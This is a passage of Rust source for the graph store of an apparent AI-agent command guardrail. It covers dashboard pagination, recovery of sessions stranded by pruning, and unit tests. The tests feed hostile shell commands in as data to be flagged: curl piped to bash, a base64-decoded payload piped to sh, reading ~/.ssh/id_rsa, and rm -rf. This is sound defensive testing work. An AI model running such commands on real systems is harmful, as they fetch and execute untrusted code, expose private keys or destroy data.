            blocked: stats.blocked,
            review: stats.review,
            allowed: stats.allow_verdicts,
            deny_verdicts: stats.deny_verdicts,
            review_verdicts: stats.review_verdicts,
            allow_verdicts: stats.allow_verdicts,
            unknown_verdicts: stats.unknown_verdicts,
            actual_blocks: stats.actual_blocks,
            would_block: stats.would_block,
            screened: stats.screened,
            outcomes_unknown: stats.outcomes_unknown,
            top_categories,
            recent_blocks: blocks,
            recent_decisions,
        }
    }

    /// Build the full drill-down view of one command node: its verdict, risk,
    /// decided_by, the ATR categories + OWASP-Agentic ids it triggered, and the
    /// human explanation. The linked category/asi labels are read from the graph.
    fn cmd_view(&self, n: &Node, recommendation: String, ix: &Index) -> CmdView {
        let linked = |kind: &'static str| -> Vec<String> {
            ix.out
                .get(n.id.as_str())
                .into_iter()
                .flatten()
                .filter(|e| e.kind == "triggered" || e.kind == "flags")
                .filter_map(|e| ix.by_id.get(e.to.as_str()).filter(|nn| nn.kind == kind))
                .map(|nn| nn.label.clone())
                .collect()
        };
        CmdView {
            id: n.id.clone(),
            seq: n
                .attrs
                .get("seq")
                .and_then(|s| s.parse::<usize>().ok())
                .unwrap_or(0),
            command: n.label.clone(),
            recommendation,
            outcome: n
                .attrs
                .get("outcome")
                .cloned()
                .unwrap_or_else(|| "unknown".into()),
            mode_at_decision: n
                .attrs
                .get("mode_at_decision")
                .cloned()
                .unwrap_or_else(|| "unknown".into()),
            recorded_at_ms: n
                .attrs
                .get("recorded_at_ms")
                .and_then(|s| s.parse::<u64>().ok()),
            risk: n.attrs.get("risk").and_then(|r| r.parse::<i64>().ok()),
            decided_by: n
                .attrs
                .get("decided_by")
                .cloned()
                .unwrap_or_else(|| "unknown".into()),
            categories: linked("category"),
            asi: linked("asi"),
            explanation: n.attrs.get("explanation").cloned().unwrap_or_default(),
        }
    }

    /// A filtered, paginated view of the sessions for the dashboard's Cases screen.
    /// Sessions come newest-first. `session` narrows to one (by label or id);
    /// `verdict` (deny|review|allow) and `query` (command substring, case-
    /// insensitive) filter the commands and drop sessions with no match. Pagination
    /// (`offset`/`limit`) is over the MATCHING sessions, so the browser never loads
    /// the whole graph. Per-session commands are capped (with `truncated`) to bound
    /// the payload. Pure/tested.
    pub fn cases_page(
        &self,
        session: Option<&str>,
        verdict: Option<&str>,
        query: Option<&str>,
        offset: usize,
        limit: usize,
    ) -> CasesPage {
        const MAX_ITEMS: usize = 500;
        let q = query
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_lowercase);
        let verdict = verdict.filter(|v| matches!(*v, "deny" | "review" | "allow" | "unknown"));
        let has_cmd_filter = verdict.is_some() || q.is_some();
        let ix = self.index();

        let node_positions: HashMap<&str, usize> = self
            .nodes
            .iter()
            .enumerate()
            .map(|(index, node)| (node.id.as_str(), index))
            .collect();
        let latest_command_position = |session: &Node| {
            ix.out
                .get(session.id.as_str())
                .into_iter()
                .flatten()
                .filter(|edge| edge.kind == "ran")
                .filter_map(|edge| node_positions.get(edge.to.as_str()).copied())
                .max()
                .unwrap_or_else(|| {
                    node_positions
                        .get(session.id.as_str())
                        .copied()
                        .unwrap_or(0)
                })
        };
        let mut sessions: Vec<&Node> = self.nodes.iter().filter(|n| n.kind == "session").collect();
        // Sessions whose anchor node was pruned and never recreated.
        //
        // `drop_oldest` no longer removes anchors, but stores written before
        // that fix still hold commands whose session node is simply gone: on
        // the operator's machine, 150 commands across two finished sessions
        // that never ran again to recreate theirs. Without this they are
        // counted by the Overview and reachable from no list at all, which is
        // the same invisibility the id fallback below was written to end.
        //
        // Rebuilt from the command ids, which carry the session, so a recovered
        // session behaves exactly like a live one.
        let anchored: std::collections::HashSet<&str> = sessions
            .iter()
            .map(|s| s.id.strip_prefix("session:").unwrap_or(&s.id))
            .collect();
        let mut recovered: Vec<Node> = Vec::new();
        let mut seen_recovered: std::collections::HashSet<String> = std::collections::HashSet::new();
        for node in &self.nodes {
            if node.kind != "command" {
                continue;
            }
            let Some(rest) = node.id.strip_prefix("cmd:") else {
                continue;
            };
            let Some((session_key, _)) = rest.rsplit_once(':') else {
                continue;
            };
            if anchored.contains(session_key) || !seen_recovered.insert(session_key.to_string()) {
                continue;
            }
            recovered.push(Node {
                id: format!("session:{session_key}"),
                kind: "session".into(),
                label: session_key.to_string(),
                attrs: BTreeMap::new(),
            });
        }
        sessions.extend(recovered.iter());
        sessions.sort_by_key(|session| std::cmp::Reverse(latest_command_position(session)));

        // A matching session, LIGHTWEIGHT: totals + the matched command node refs,
        // but NOT the heavy `cmd_view` (categories/asi/explanation). The `cmd_view`
        // is materialized in pass 2 only for the sessions on the requested page, so a
        // deep offset doesn't build detail for every session in the graph.
        struct Kept<'a> {
            s: &'a Node,
            total: usize,
            blocked: usize,
            review: usize,
            allowed: usize,
            unknown_verdicts: usize,
            actual_blocks: usize,
            would_block: usize,
            screened: usize,
            outcomes_unknown: usize,
            matched: Vec<&'a Node>,
            matched_count: usize,
        }
        let mut kept: Vec<Kept> = Vec::new();
        let mut total_commands = 0usize;
        for s in sessions {
            if let Some(sf) = session {
                let short_id = s.id.strip_prefix("session:").unwrap_or(&s.id);
                if sf != s.label && sf != short_id && sf != s.id {
                    continue;
                }
            }
            // Commands reached by the `ran` edge, PLUS any whose id names this
            // session and whose edge is gone.
            //
            // The id is `cmd:{session}:{seq}` (see `ingest_verdict`), so the
            // link is recoverable from the node itself and needs no extra edge
            // and no extra bytes in the store. That matters because a prune
            // used to drop the session anchor and take every `ran` edge with
            // it: on the operator's own machine 13,748 of 15,632 commands, 88%
            // of the record, were unreachable from this list while the Overview
            // happily counted all of them. `drop_oldest` no longer drops
            // anchors, but that only protects material recorded from now on;
            // this recovers what was already stranded.
            let session_key = s.id.strip_prefix("session:").unwrap_or(&s.id);
            let prefix = format!("cmd:{session_key}:");
            let mut seen: std::collections::HashSet<&str> = std::collections::HashSet::new();
            let mut cmds: Vec<&Node> = ix
                .out
                .get(s.id.as_str())
                .into_iter()
                .flatten()
                .filter(|e| e.kind == "ran")
                .filter_map(|e| ix.by_id.get(e.to.as_str()).copied())
                .inspect(|n| {
                    seen.insert(n.id.as_str());
                })
                .collect();
            cmds.extend(
                self.nodes
                    .iter()
                    .filter(|n| n.kind == "command")
                    .filter(|n| n.id.starts_with(prefix.as_str()))
                    .filter(|n| !seen.contains(n.id.as_str())),
            );
            cmds.sort_by_key(|n| {
                std::cmp::Reverse(
                    n.attrs
                        .get("seq")
                        .and_then(|x| x.parse::<usize>().ok())
                        .unwrap_or(0),
                )
            });

            let (mut blocked, mut review, mut allowed, mut unknown_verdicts) =
                (0usize, 0usize, 0usize, 0usize);
            let (mut actual_blocks, mut would_block, mut screened, mut outcomes_unknown) =
                (0usize, 0usize, 0usize, 0usize);
            let mut matched: Vec<&Node> = Vec::new();
            let mut matched_count = 0usize;
            for n in &cmds {
                let rec = n
                    .attrs
                    .get("recommendation")
                    .map(String::as_str)
                    .unwrap_or("unknown");
                match rec {
                    "deny" => blocked += 1,
                    "review" => review += 1,
                    "allow" => allowed += 1,
                    _ => unknown_verdicts += 1,
                }
                match n.attrs.get("outcome").map(String::as_str) {
                    Some("blocked") => actual_blocks += 1,
                    Some("would_block") => would_block += 1,
                    Some("screened") => screened += 1,
                    Some("allowed") => {}
                    _ => outcomes_unknown += 1,
                }
                if let Some(vf) = verdict {
                    if rec != vf {
                        continue;
                    }
                }
                if let Some(ref qq) = q {
                    if !n.label.to_lowercase().contains(qq) {
                        continue;
                    }
                }
                matched_count += 1;
                if matched.len() < MAX_ITEMS {
                    matched.push(n);
                }
            }

            if has_cmd_filter && matched_count == 0 {
                continue; // nothing in this session matches the command filter
            }
            total_commands += if has_cmd_filter {
                matched_count
            } else {
                cmds.len()
            };
            kept.push(Kept {
                s,
                total: cmds.len(),
                blocked,
                review,
                allowed,
                unknown_verdicts,
                actual_blocks,
                would_block,
                screened,
                outcomes_unknown,
                matched,
                matched_count,
            });
        }

        let total_sessions = kept.len();
        // Pass 2: build the heavy drill-down only for the visible page.
        let views: Vec<SessionView> = kept
            .into_iter()
            .skip(offset)
            .take(limit)
            .map(|k| {
                let items: Vec<CmdView> = k
                    .matched
                    .iter()
                    .map(|n| {
                        let rec = n
                            .attrs
                            .get("recommendation")
                            .cloned()
                            .unwrap_or_else(|| "unknown".into());
                        self.cmd_view(n, rec, &ix)
                    })
                    .collect();
                SessionView {
                    id: k.s.id.clone(),
                    label: k.s.label.clone(),
                    commands: k.total,
                    blocked: k.blocked,
                    review: k.review,
                    allowed: k.allowed,
                    deny_verdicts: k.blocked,
                    review_verdicts: k.review,
                    allow_verdicts: k.allowed,
                    unknown_verdicts: k.unknown_verdicts,
                    actual_blocks: k.actual_blocks,
                    would_block: k.would_block,
                    screened: k.screened,
                    outcomes_unknown: k.outcomes_unknown,
                    truncated: k.matched_count > items.len(),
                    items,
                }
            })
            .collect();

        CasesPage {
            sessions: views,
            total_sessions,
            total_commands,
            offset,
            limit,
        }
    }
}

/// Node counts for a quick summary.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct GraphStats {
    pub sessions: usize,
    pub commands: usize,
    /// Backwards-compatible alias for `deny_verdicts`; not proof of enforcement.
    pub blocked: usize,
    /// Backwards-compatible alias for `review_verdicts`.
    pub review: usize,
    pub deny_verdicts: usize,
    pub review_verdicts: usize,
    pub allow_verdicts: usize,
    pub unknown_verdicts: usize,
    pub actual_blocks: usize,
    pub would_block: usize,
    pub screened: usize,
    pub outcomes_unknown: usize,
}

/// The Home-screen summary (JSON-serialized by the dashboard API).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct Overview {
    pub sessions: usize,
    pub commands: usize,
    /// Legacy deny-verdict alias retained for old dashboard bundles.
    pub blocked: usize,
    /// Legacy review-verdict alias retained for old dashboard bundles.
    pub review: usize,
    /// Legacy allow-verdict alias retained for old dashboard bundles.
    pub allowed: usize,
    pub deny_verdicts: usize,
    pub review_verdicts: usize,
    pub allow_verdicts: usize,
    pub unknown_verdicts: usize,
    pub actual_blocks: usize,
    pub would_block: usize,
    pub screened: usize,
    pub outcomes_unknown: usize,
    pub top_categories: Vec<CategoryCount>,
    /// Legacy list of deny verdicts; entries now include their actual outcome.
    pub recent_blocks: Vec<BlockSummary>,
    pub recent_decisions: Vec<DecisionSummary>,
}

/// An ATR category and how many commands triggered it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct CategoryCount {
    pub name: String,
    pub count: usize,
}

/// A recent command decision. `id` is the persisted command node's stable id.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct DecisionSummary {
    pub id: String,
    pub session: String,
    pub command: String,
    pub recommendation: String,
    pub outcome: String,
    pub mode_at_decision: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub recorded_at_ms: Option<u64>,
    pub categories: Vec<String>,
    /// Which pipeline layer decided this ("rules" | "graph" | "warden" | ...).
    pub decided_by: String,
}

/// Backwards-compatible Rust name for the legacy `recent_blocks` collection.
pub type BlockSummary = DecisionSummary;

/// One command's full drill-down detail for the Cases screen.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct CmdView {
    pub id: String,
    pub seq: usize,
    pub command: String,
    pub recommendation: String,
    pub outcome: String,
    pub mode_at_decision: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub recorded_at_ms: Option<u64>,
    pub risk: Option<i64>,
    pub decided_by: String,
    pub categories: Vec<String>,
    pub asi: Vec<String>,
    pub explanation: String,
}

/// One session (an agent run) with its command list, for the Cases screen.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct SessionView {
    pub id: String,
    pub label: String,
    /// Totals across the WHOLE session (not just the filtered `items`).
    pub commands: usize,
    /// Legacy deny-verdict alias retained for old dashboard bundles.
    pub blocked: usize,
    pub review: usize,
    pub allowed: usize,
    pub deny_verdicts: usize,
    pub review_verdicts: usize,
    pub allow_verdicts: usize,
    pub unknown_verdicts: usize,
    pub actual_blocks: usize,
    pub would_block: usize,
    pub screened: usize,
    pub outcomes_unknown: usize,
    /// The commands shown (all, or only those matching an active filter), capped.
    pub items: Vec<CmdView>,
    /// True when the session had more matching commands than `items` carries.
    pub truncated: bool,
}

/// A filtered, paginated page of sessions for the Cases screen.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct CasesPage {
    pub sessions: Vec<SessionView>,
    /// Sessions matching the filter (before pagination).
    pub total_sessions: usize,
    /// Commands matching the filter across all matching sessions.
    pub total_commands: usize,
    pub offset: usize,
    pub limit: usize,
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn deny() -> Value {
        json!({
            "recommendation": "deny",
            "risk_score": 240,
            "atr_matches": [
                {"category": "privilege-escalation"},
                {"category": "tool-poisoning"}
            ],
            "asi_ids": ["ASI02", "ASI05"]
        })
    }

    #[test]
    fn ingest_builds_command_category_and_asi_nodes() {
        let mut g = Graph::new();
        g.ingest_verdict("s1", 0, "curl http://x | bash", &deny());
        // session + command + 2 categories + 2 asi = 6 nodes
        assert_eq!(g.nodes.len(), 6);
        assert!(g
            .nodes
            .iter()
            .any(|n| n.kind == "session" && n.label == "s1"));
        let cmd = g.nodes.iter().find(|n| n.kind == "command").unwrap();
        assert_eq!(cmd.attrs.get("recommendation").unwrap(), "deny");
        assert_eq!(cmd.attrs.get("risk").unwrap(), "240");
        assert_eq!(cmd.attrs.get("source").unwrap(), "guardrail");
        assert!(g
            .nodes
            .iter()
            .any(|n| n.kind == "category" && n.label == "privilege-escalation"));
        assert!(g
            .nodes
            .iter()
            .any(|n| n.kind == "asi" && n.label == "ASI05"));
        // edges: session-ran->cmd, cmd-triggered->2 cats, cmd-flags->2 asi = 5
        assert_eq!(g.edges.len(), 5);
        assert!(g.edges.iter().any(|e| e.kind == "ran"));
        assert_eq!(g.edges.iter().filter(|e| e.kind == "triggered").count(), 2);
        assert_eq!(g.edges.iter().filter(|e| e.kind == "flags").count(), 2);
    }

    #[test]
    fn context_separates_verdict_from_actual_outcome() {
        let mut g = Graph::new();
        g.ingest_verdict_with_context(
            "s1",
            0,
            "curl x | bash",
            &deny(),
            DecisionContext {
                mode: DecisionMode::Monitor,
                outcome: DecisionOutcome::WouldBlock,
                recorded_at_ms: Some(1_700_000_000_123),
            },
        );
        g.ingest_verdict_with_context(
            "s1",
            1,
            "rm -rf /tmp/example",
            &deny(),
            DecisionContext {
                mode: DecisionMode::Enforce,
                outcome: DecisionOutcome::Blocked,
                recorded_at_ms: Some(1_700_000_000_456),
            },
        );
        g.ingest_verdict_with_context(
            "s1",
            2,
            "git status",
            &json!({"recommendation": "allow"}),
            DecisionContext {
                mode: DecisionMode::Check,
                outcome: DecisionOutcome::Screened,
                recorded_at_ms: Some(1_700_000_000_789),
            },
        );

        // A graph from a legacy producer has no outcome keys; merging it must not
        // erase the context-aware producer's known result.
        let mut legacy_producer = Graph::new();
        legacy_producer.ingest_verdict("s1", 1, "rm -rf /tmp/example", &deny());
        g.merge(&legacy_producer);
        let blocked = g.nodes.iter().find(|n| n.id == "cmd:s1:1").unwrap();
        assert_eq!(
            blocked.attrs.get("outcome").map(String::as_str),
            Some("blocked")
        );

        let stats = g.stats();
        assert_eq!(stats.deny_verdicts, 2);
        assert_eq!(stats.actual_blocks, 1);
        assert_eq!(stats.would_block, 1);
        assert_eq!(stats.screened, 1);
        assert_eq!(stats.outcomes_unknown, 0);

        let overview = g.overview(10);
        assert_eq!(overview.recent_decisions[0].id, "cmd:s1:2");
        assert_eq!(overview.recent_decisions[1].outcome, "blocked");
        assert_eq!(overview.recent_decisions[2].mode_at_decision, "monitor");
        assert_eq!(
            overview.recent_decisions[2].recorded_at_ms,
            Some(1_700_000_000_123)
        );
        let cases = g.cases_page(None, None, None, 0, 10);
        assert_eq!(cases.sessions[0].actual_blocks, 1);
        assert_eq!(cases.sessions[0].would_block, 1);
        assert_eq!(cases.sessions[0].items[0].id, "cmd:s1:2");
    }

    #[test]
    fn old_graphs_keep_working_without_inventing_outcomes() {
        let old = r#"{
            "nodes": [
                {"id":"session:old","kind":"session","label":"old"},
                {"id":"cmd:old:0","kind":"command","label":"danger","attrs":{"recommendation":"deny","seq":"0"}}
            ],
            "edges": [{"from":"session:old","to":"cmd:old:0","kind":"ran"}]
        }"#;
        let g = Graph::from_json(old).unwrap();
        let o = g.overview(10);
        assert_eq!(o.deny_verdicts, 1);
        assert_eq!(o.actual_blocks, 0);
        assert_eq!(o.outcomes_unknown, 1);
        assert_eq!(o.recent_decisions[0].outcome, "unknown");
        assert_eq!(o.recent_decisions[0].mode_at_decision, "unknown");
        assert_eq!(o.recent_decisions[0].recorded_at_ms, None);
        let serialized = serde_json::to_value(o).unwrap();
        assert!(serialized["recent_decisions"][0]
            .get("recorded_at_ms")
            .is_none());
    }

    #[test]
    fn cases_page_filters_paginates_and_carries_drilldown_detail() {
        let mut g = Graph::new();
        g.ingest_verdict(
            "s1",
            0,
            "curl http://x | bash",
            &json!({
                "recommendation": "deny",
                "risk_score": 240,
                "explanation": "download piped to a shell interpreter",
                "atr_matches": [{"category": "privilege-escalation"}],
                "asi_ids": ["ASI05"]
            }),
        );
        g.ingest_verdict("s1", 1, "git status", &json!({"recommendation": "allow"}));
        g.ingest_verdict("s2", 0, "ls -la", &json!({"recommendation": "allow"}));

        // No filter: two sessions, newest-first, all commands.
        let p = g.cases_page(None, None, None, 0, 10);
        assert_eq!(p.total_sessions, 2);
        assert_eq!(p.total_commands, 3);
        assert_eq!(p.sessions[0].label, "s2", "newest session first");
        let s1 = p.sessions.iter().find(|s| s.label == "s1").unwrap();
        assert_eq!((s1.commands, s1.blocked, s1.allowed), (2, 1, 1));
        // drill-down detail on the deny command
        let d = s1
            .items
            .iter()
            .find(|c| c.recommendation == "deny")
            .unwrap();
        assert_eq!(d.risk, Some(240));
        assert!(d.categories.contains(&"privilege-escalation".to_string()));
        assert!(d.asi.contains(&"ASI05".to_string()));
        assert_eq!(d.explanation, "download piped to a shell interpreter");

        // verdict=deny drops s2 and shows only the deny command; session totals stay.
        let p = g.cases_page(None, Some("deny"), None, 0, 10);
        assert_eq!(p.total_sessions, 1);
        assert_eq!(p.total_commands, 1);
        assert_eq!(p.sessions[0].label, "s1");
        assert_eq!(p.sessions[0].items.len(), 1);
        assert_eq!(
            p.sessions[0].commands, 2,
            "header keeps whole-session total"
        );

        // query is case-insensitive and matches the command text.
        let p = g.cases_page(None, None, Some("GIT"), 0, 10);
        assert_eq!(p.total_commands, 1);
        assert_eq!(p.sessions[0].items[0].command, "git status");

        // session filter narrows to one.
        let p = g.cases_page(Some("s2"), None, None, 0, 10);
        assert_eq!(p.total_sessions, 1);
        assert_eq!(p.sessions[0].label, "s2");

        // pagination is over sessions.
        let p0 = g.cases_page(None, None, None, 0, 1);
        assert_eq!((p0.sessions.len(), p0.total_sessions), (1, 2));
        let p1 = g.cases_page(None, None, None, 1, 1);
        assert_eq!(p1.sessions[0].label, "s1");
    }

    #[test]
    fn cases_page_keeps_newest_commands_and_reorders_reused_sessions() {
        let mut g = Graph::new();
        for seq in 0..=500 {
            g.ingest_verdict(
                "long",
                seq,
                &format!("command-{seq}"),
                &json!({"recommendation": "allow"}),
            );
        }
        g.ingest_verdict(
            "newer-session",
            0,
            "first",
            &json!({"recommendation": "allow"}),
        );
        g.ingest_verdict("long", 501, "latest", &json!({"recommendation": "allow"}));

        let page = g.cases_page(None, None, None, 0, 10);
        assert_eq!(page.sessions[0].label, "long");
        assert_eq!(page.sessions[0].items.len(), 500);
        assert_eq!(page.sessions[0].items[0].command, "latest");
        assert_eq!(page.sessions[0].items[499].command, "command-2");
        assert!(page.sessions[0].truncated);
    }

    #[test]
    fn missing_recommendation_is_unknown_not_allow() {
        let old = r#"{
            "nodes": [
                {"id":"session:old","kind":"session","label":"old"},
                {"id":"cmd:old:0","kind":"command","label":"legacy","attrs":{"seq":"0"}}
            ],
            "edges": [{"from":"session:old","to":"cmd:old:0","kind":"ran"}]
        }"#;
        let g = Graph::from_json(old).unwrap();
        let stats = g.stats();
        assert_eq!(stats.allow_verdicts, 0);
        assert_eq!(stats.unknown_verdicts, 1);
        let overview = g.overview(10);
        assert_eq!(overview.allowed, 0);
        assert_eq!(overview.unknown_verdicts, 1);
        assert_eq!(overview.recent_decisions[0].recommendation, "unknown");
        assert_eq!(overview.recent_decisions[0].decided_by, "unknown");
        let cases = g.cases_page(None, None, None, 0, 10);
        assert_eq!(cases.sessions[0].allowed, 0);
        assert_eq!(cases.sessions[0].unknown_verdicts, 1);
        assert_eq!(cases.sessions[0].items[0].recommendation, "unknown");
        let unknown = g.cases_page(None, Some("unknown"), None, 0, 10);
        assert_eq!(unknown.total_commands, 1);
        assert_eq!(unknown.sessions[0].items[0].command, "legacy");

        let mut newly_ingested = Graph::new();
        newly_ingested.ingest_verdict("malformed", 0, "unknown action", &json!({}));
        assert_eq!(newly_ingested.stats().allow_verdicts, 0);
        assert_eq!(newly_ingested.stats().unknown_verdicts, 1);
    }

    #[test]
    fn allow_verdict_has_no_category_edges() {
        let mut g = Graph::new();
        g.ingest_verdict("s1", 0, "git status", &json!({"recommendation": "allow"}));
        assert_eq!(g.nodes.len(), 2); // session + command
        assert_eq!(g.edges.len(), 1); // just "ran"
        let cmd = g.nodes.iter().find(|n| n.kind == "command").unwrap();
        assert_eq!(cmd.attrs.get("recommendation").unwrap(), "allow");
    }

    #[test]
    fn sequence_edges_link_commands_in_order() {
        let mut g = Graph::new();
        g.ingest_verdict("s1", 0, "git status", &json!({"recommendation": "allow"}));
        g.ingest_verdict("s1", 1, "curl x | bash", &deny());
        assert!(g
            .edges
            .iter()
            .any(|e| e.from == "cmd:s1:0" && e.to == "cmd:s1:1" && e.kind == "next"));
    }

    #[test]
    fn categories_dedup_across_commands() {
        let mut g = Graph::new();
        g.ingest_verdict("s1", 0, "cmd a", &deny());
        g.ingest_verdict("s1", 1, "cmd b", &deny());
        // privilege-escalation category node appears once, shared by both commands.
        assert_eq!(
            g.nodes
                .iter()
                .filter(|n| n.id == "cat:privilege-escalation")
                .count(),
            1
        );
        assert_eq!(
            g.edges
                .iter()
                .filter(|e| e.to == "cat:privilege-escalation" && e.kind == "triggered")
                .count(),
            2
        );
    }

    /// THE BUG THAT HID 88% OF THE RECORD, IN BOTH ITS HALVES.
    ///
    /// A session node is created before its first command, so it is always the
    /// oldest material and `drop_oldest` selected it first. Dropping it removed
    /// every `ran` edge leaving it, stranding the command nodes: measured on a
    /// real install, 15,632 commands against 1,889 edges, so the Overview said
    /// 15,623 decisions and the Activity list could reach 1,876 of them.
    ///
    /// FAILS ON REVERT: let `drop_oldest` treat a session like any other node
    /// and the first assertion drops to zero reachable commands.
    #[test]
    fn pruning_never_strands_a_session_from_its_commands() {
        let mut g = Graph::default();
        // Session first, exactly as the real ingest does it, then commands.
        for seq in 0..40usize {
            g.ingest_verdict("s1", seq, &format!("cmd {seq}"), &json!({"recommendation": "allow"}));
        }
        let before = g.cases_page(None, None, None, 0, 100);
        assert_eq!(before.total_commands, 40, "precondition: all 40 are reachable");

        // Prune hard enough to reach the session anchor at the front.
        g.drop_oldest(30);

        let after = g.cases_page(None, None, None, 0, 100);
        assert!(
            after.total_commands > 0,
            "pruning removed the session anchor and every surviving command \
             became unreachable, which is exactly how 13,748 real decisions \
             went missing from the dashboard"
        );
        assert!(
            g.nodes.iter().any(|n| n.kind == "session"),
            "the anchor must survive a prune: it is the only path a reader has \
             into the history, and it costs one node"
        );
    }

    /// The recovery half: commands whose edge was ALREADY lost are still found,
    /// because `cmd:{session}:{seq}` names its own session.
    ///
    /// FAILS ON REVERT: drop the id-derived fallback in `page` and this reads 0.
    #[test]
    fn commands_are_found_even_when_their_edge_is_gone() {
        let mut g = Graph::default();
        for seq in 0..10usize {
            g.ingest_verdict("s1", seq, &format!("cmd {seq}"), &json!({"recommendation": "allow"}));
        }
        // Simulate the damage already on disk: the anchor's edges are gone but
        // the command nodes remain.
        g.edges.retain(|e| e.kind != "ran");

        let page = g.cases_page(None, None, None, 0, 100);
        assert_eq!(
            page.total_commands, 10,
            "every command names its own session in its id, so a missing edge \
             must not make it invisible"
        );
    }

    /// The last 150 that the id fallback alone could not reach.
    ///
    /// A session whose anchor was pruned and whose agent never ran again has no
    /// session node to hang commands from, so a list that iterates session
    /// nodes skips it entirely while the Overview keeps counting its commands.
    /// The anchor is rebuilt from the ids instead.
    ///
    /// FAILS ON REVERT: drop the recovery loop and total_commands falls back to
    /// only the sessions that still have a node.
    #[test]
    fn a_session_whose_anchor_was_pruned_is_still_listed() {
        let mut g = Graph::default();
        for seq in 0..12usize {
            g.ingest_verdict("ghost", seq, &format!("cmd {seq}"), &json!({"recommendation": "allow"}));
        }
        // The exact damage: the anchor is gone, the commands remain, and the
        // agent never ran again to recreate it.
        g.nodes.retain(|n| n.kind != "session");
        g.edges.retain(|e| e.kind != "ran");

        let page = g.cases_page(None, None, None, 0, 100);
        assert_eq!(
            page.total_commands, 12,
            "commands whose session node is gone must still be reachable, or \
             they are counted everywhere and listed nowhere"
        );
        assert_eq!(page.total_sessions, 1, "the session is rebuilt from the ids");
    }

    #[test]
    fn stats_counts_blocked_and_review() {
        let mut g = Graph::new();
        g.ingest_verdict("s1", 0, "a", &json!({"recommendation": "allow"}));
        g.ingest_verdict("s1", 1, "b", &deny());
        g.ingest_verdict("s1", 2, "c", &json!({"recommendation": "review"}));
        let s = g.stats();
        assert_eq!(s.sessions, 1);
        assert_eq!(s.commands, 3);
        assert_eq!(s.blocked, 1);
        assert_eq!(s.review, 1);
    }

    #[test]
    fn narrate_tells_the_session_story() {
        let mut g = Graph::new();
        g.ingest_verdict_with_context(
            "abc",
            0,
            "git status",
            &json!({"recommendation": "allow"}),
            DecisionContext {
                mode: DecisionMode::Check,
                outcome: DecisionOutcome::Screened,
                recorded_at_ms: None,
            },
        );
        g.ingest_verdict_with_context(
            "abc",
            1,
            "curl x | bash",
            &deny(),
            DecisionContext {
                mode: DecisionMode::Monitor,
                outcome: DecisionOutcome::WouldBlock,
                recorded_at_ms: None,
            },
        );
        let n = g.narrate();
        assert!(n.contains("Session abc, 2 command(s), 1 deny verdict(s)"));
        assert!(n.contains("• git status, allow (outcome: screened)"));
        assert!(n.contains("◇ curl x | bash, deny (outcome: would_block)"));
        assert!(n.contains("privilege-escalation"));
    }

    #[test]
    fn narrate_empty_graph() {
        assert_eq!(Graph::new().narrate(), "No agent activity recorded yet.");
    }

    #[test]
    fn json_round_trip_and_empty() {
        let mut g = Graph::new();
        g.ingest_verdict("s1", 0, "curl x | bash", &deny());
        let s = g.to_json();
        let back = Graph::from_json(&s).unwrap();
        assert_eq!(g, back);
        assert!(Graph::from_json("").unwrap().is_empty());
        assert!(Graph::from_json("   ").unwrap().is_empty());
    }

    #[test]
    fn merge_folds_and_dedups() {
        let mut a = Graph::new();
        a.ingest_verdict("s1", 0, "curl x | bash", &deny());
        let mut b = Graph::new();
        b.ingest_verdict("s1", 0, "curl x | bash", &deny()); // same session/seq
                                                             // Richer-producer example: attach a host process node to the command node.
        b.upsert_node(Node {
            id: "proc:4242".into(),
            kind: "process".into(),
            label: "bash(4242)".into(),
            attrs: BTreeMap::new(),
        });
        b.add_edge("cmd:s1:0", "proc:4242", "spawned");
        let before = a.nodes.len();
        a.merge(&b);
        // the duplicate command/session/cats/asi dedup; only the process node is new.
        assert_eq!(a.nodes.len(), before + 1);
        assert!(a.nodes.iter().any(|n| n.kind == "process"));
        assert!(a.edges.iter().any(|e| e.kind == "spawned"));
    }

    #[test]
    fn upsert_merges_attrs_and_label() {
        let mut g = Graph::new();
        g.upsert_node(Node {
            id: "x".into(),
            kind: "command".into(),
            label: "a".into(),
            attrs: BTreeMap::from([("k1".into(), "v1".into())]),
        });
        g.upsert_node(Node {
            id: "x".into(),
            kind: "command".into(),
            label: "b".into(),
            attrs: BTreeMap::from([("k2".into(), "v2".into())]),
        });
        assert_eq!(g.nodes.len(), 1);
        let n = &g.nodes[0];
        assert_eq!(n.label, "b"); // later non-empty label wins
        assert_eq!(n.attrs.get("k1").unwrap(), "v1");
        assert_eq!(n.attrs.get("k2").unwrap(), "v2");
    }

    #[test]
    fn decided_by_defaults_to_rules_and_honors_override() {
        let mut g = Graph::new();
        g.ingest_verdict("s", 0, "curl x | bash", &deny()); // no decided_by -> rules
                                                            // an ambiguous case the on-device Warden model escalated:
        g.ingest_verdict(
            "s",
            1,
            "echo ZXZpbA== | base64 -d | sh",
            &json!({"recommendation":"deny","decided_by":"warden","atr_matches":[{"category":"obfuscation"}]}),
        );
        let cmds: Vec<&Node> = g.nodes.iter().filter(|n| n.kind == "command").collect();
        assert_eq!(cmds[0].attrs.get("decided_by").unwrap(), "rules");
        assert_eq!(cmds[1].attrs.get("decided_by").unwrap(), "warden");
        // it flows into the Home overview's recent blocks too.
        let o = g.overview(10);
        assert_eq!(o.recent_blocks[0].decided_by, "warden"); // newest first
        assert_eq!(o.recent_blocks[1].decided_by, "rules");
    }

    #[test]
    fn overview_summarizes_counts_categories_and_recent_blocks() {
        let mut g = Graph::new();
        g.ingest_verdict("s1", 0, "ls", &json!({"recommendation":"allow"}));
        g.ingest_verdict("s1", 1, "curl x | bash", &deny()); // priv-esc + tool-poisoning
        g.ingest_verdict("s1", 2, "cat ~/.ssh/id_rsa", &deny());
        g.ingest_verdict("s1", 3, "sudo -l", &json!({"recommendation":"review"}));
        let o = g.overview(10);
        assert_eq!(o.sessions, 1);
        assert_eq!(o.commands, 4);
        assert_eq!(o.blocked, 2);
        assert_eq!(o.deny_verdicts, 2);
        assert_eq!(o.review, 1);
        assert_eq!(o.allowed, 1);
        // top categories: privilege-escalation + tool-poisoning appear twice each.
        assert!(o
            .top_categories
            .iter()
